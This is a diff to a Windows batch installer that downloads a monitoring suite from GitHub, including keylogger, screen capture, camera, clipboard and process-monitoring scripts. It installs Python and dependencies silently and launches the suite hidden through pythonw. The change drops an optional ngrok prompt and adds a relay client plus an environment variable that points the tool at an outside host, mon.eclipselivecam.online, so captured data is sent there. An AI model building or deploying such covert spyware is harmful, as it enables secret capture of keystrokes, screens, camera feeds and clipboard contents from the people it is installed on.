@@ -11,21 +11,8 @@ mkdir "%DIR%\recordings" 2>nul
 :: Download all files from GitHub
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "$r='%RAW%'; $d='%DIR%';" ^
-  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
+  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
   "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""
-
-:: Ask for ngrok token once, save for future runs
-if not exist "%TOKENFILE%" (
-    echo.
-    echo For remote phone access, enter your ngrok token.
-    echo Get one free at ngrok.com - sign up then copy your authtoken.
-    echo Press Enter to skip ^(local network only^).
-    echo.
-    set /p NGROK_TOKEN=Ngrok token:
-    if not "!NGROK_TOKEN!"=="" (
-        echo !NGROK_TOKEN!> "%TOKENFILE%"
-    )
-)
 
 :: Install Python silently if not present
 python --version >nul 2>&1
@@ -39,7 +26,8 @@ if %errorlevel% neq 0 (
 :: Install dependencies quietly
 pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location
 
-:: Launch from install dir so relative paths resolve correctly
+:: Launch in relay mode — connects to the hosted relay server
+set "NORA_RELAY=https://mon.eclipselivecam.online"
 start "" /D "%DIR%" pythonw "%DIR%\app.py"
 
 endlocal
